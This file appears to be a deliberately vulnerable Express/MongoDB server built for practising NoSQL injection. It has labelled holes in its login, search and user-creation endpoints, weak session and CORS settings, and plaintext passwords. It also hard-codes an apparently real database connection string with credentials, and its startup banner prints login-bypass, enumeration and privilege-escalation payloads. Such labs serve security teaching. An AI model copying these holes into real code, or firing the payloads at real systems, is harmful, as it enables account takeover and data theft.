const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const bodyParser = require("body-parser");
const session = require("express-session");

const app = express();
const PORT = process.env.PORT || 5001;

// ⚠️ VULNERABLE: Permissive CORS
app.use(cors({ origin: true, credentials: true }));
app.use(bodyParser.json({ limit: "50mb" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "50mb" }));

// ⚠️ VULNERABLE: Weak session
app.use(
  session({
    secret: "weak-secret-key",
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false, httpOnly: false, maxAge: 24 * 60 * 60 * 1000 },
  })
);

// MongoDB Configuration with your credentials
const MONGODB_URI =
  "mongodb+srv://saud1hashone:B9Vy1EWlf5NbbaEU@cluster0.thaumjt.mongodb.net/vulnerable_admin?retryWrites=true&w=majority";

// ⚠️ VULNERABLE: Mongoose Schema without validation
const userSchema = new mongoose.Schema(
  {
    username: String,
    email: String,
    password: String,
    role: { type: String, default: "User" },
    lastLogin: String,
    createdAt: { type: Date, default: Date.now },
  },
  { strict: false }
); // ⚠️ VULNERABILITY: strict: false allows any fields

const User = mongoose.model("User", userSchema);

// ⚠️ REAL NOSQL INJECTION: Login endpoint
app.post("/api/login", async (req, res) => {
  try {
    const { username, password } = req.body;

    // ⚠️ MASSIVE VULNERABILITY: Direct object injection into MongoDB query
    let query = {};

    if (typeof username === "object") {
      query.username = username; // ⚠️ VULNERABLE: Direct object injection
    } else {
      query.username = username;
    }

    if (typeof password === "object") {
      query.password = password; // ⚠️ VULNERABLE: Direct object injection
    } else {
      query.password = password;
    }

    console.log("🚨 VULNERABLE NOSQL QUERY:", JSON.stringify(query, null, 2));

    const user = await User.findOne(query);

    if (user) {
      req.session.user = user;

      res.json({
        success: true,
        message: "Login successful",
        user: {
          id: user._id,
          username: user.username,
          email: user.email,
          role: user.role,
        },
        debug: {
          query: query,
          injectionDetected:
            typeof username === "object" || typeof password === "object",
        },
      });
    } else {
      res.status(401).json({
        success: false,
        message: "Invalid credentials",
        debug: { query: query },
      });
    }
  } catch (error) {
    res.status(500).json({
      error: "Database error",
      details: error.message,
      stack: error.stack,
    });
  }
});

// ⚠️ REAL NOSQL INJECTION: User search
app.get("/api/users", async (req, res) => {
  try {
    const { search, role } = req.query;
    let query = {};

    if (search) {
      if (typeof search === "object") {
        Object.assign(query, search); // Direct object injection
      } else {
        query.$or = [
          { username: { $regex: search, $options: "i" } },
          { email: { $regex: search, $options: "i" } },
        ];
      }
    }

    if (role && typeof role === "object") {
      query.role = role;
    } else if (role) {
      query.role = role;
    }

    console.log("🚨 SEARCH QUERY:", JSON.stringify(query, null, 2));

    const users = await User.find(query);
    res.json(users);
  } catch (error) {
    res.status(500).json({ error: error.message, query: req.query });
  }
});

// ⚠️ REAL NOSQL INJECTION: User creation
app.post("/api/users", async (req, res) => {
  try {
    const userData = req.body;
    console.log("🚨 USER CREATION:", JSON.stringify(userData, null, 2));

    const newUser = new User(userData);
    await newUser.save();

    res.json({
      success: true,
      message: `User created successfully`,
      user: newUser,
    });
  } catch (error) {
    res.status(500).json({ error: error.message, userData: req.body });
  }
});

// Database initialization
async function initDB() {
  try {
    await mongoose.connect(MONGODB_URI);
    console.log("✅ Connected to MongoDB Atlas");

    // Insert sample data if needed
    const userCount = await User.countDocuments();
    if (userCount === 0) {
      await User.insertMany([
        {
          username: "admin",
          email: "admin@example.com",
          password: "admin123",
          role: "Administrator",
          lastLogin: "2024-01-15",
        },
        {
          username: "user1",
          email: "user1@example.com",
          password: "user123",
          role: "User",
          lastLogin: "2024-01-13",
        },
      ]);
      console.log("📋 Sample users created");
    }
  } catch (error) {
    console.error("❌ MongoDB failed:", error.message);
    throw error;
  }
}

// Keep other endpoints simple
app.get("/api/orders", (req, res) => {
  res.json([
    {
      id: 1001,
      customer_name: "John Doe",
      amount: 299.99,
      status: "Completed",
      order_date: "2024-01-15",
    },
    {
      id: 1002,
      customer_name: "Jane Smith",
      amount: 159.5,
      status: "Pending",
      order_date: "2024-01-14",
    },
  ]);
});

app.get("/api/dashboard/stats", (req, res) => {
  res.json({
    totalUsers: 4,
    totalOrders: 4,
    totalRevenue: 999.47,
    activeOrders: 2,
    dbType: "MongoDB",
    realDatabase: true,
  });
});

app.post("/api/logout", (req, res) => {
  req.session.destroy();
  res.json({ success: true, message: "Logged out successfully" });
});

app.post("/api/profile", (req, res) => {
  const { username } = req.body;
  res.json({
    success: true,
    message: `Profile updated for ${username}`,
    data: req.body,
  });
});

app.post("/api/settings", (req, res) => {
  res.json({
    success: true,
    message: "Settings updated successfully",
    settings: req.body,
  });
});

// Start server
async function start() {
  try {
    await initDB();

    app.listen(PORT, () => {
      console.log(`
🚨 REAL NOSQL INJECTION SERVER 🚨

⚠️  Database: MONGODB ATLAS  
⚠️  Real DB: YES - ACTUAL NOSQL INJECTION!
⚠️  Port: ${PORT}

🔥 REAL NOSQL INJECTION PAYLOADS:

📋 LOGIN BYPASS:
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

📋 USER ENUMERATION:
GET /api/users?search={"username": {"$regex": "^a"}}
GET /api/users?role={"$ne": null}

📋 PRIVILEGE ESCALATION:
POST /api/users
{"username": "hacker", "role": "Administrator", "isAdmin": true}

🎯 ALL NoSQL injection techniques work!
      `);
    });
  } catch (error) {
    console.error("❌ Server failed:", error.message);
  }
}

start();
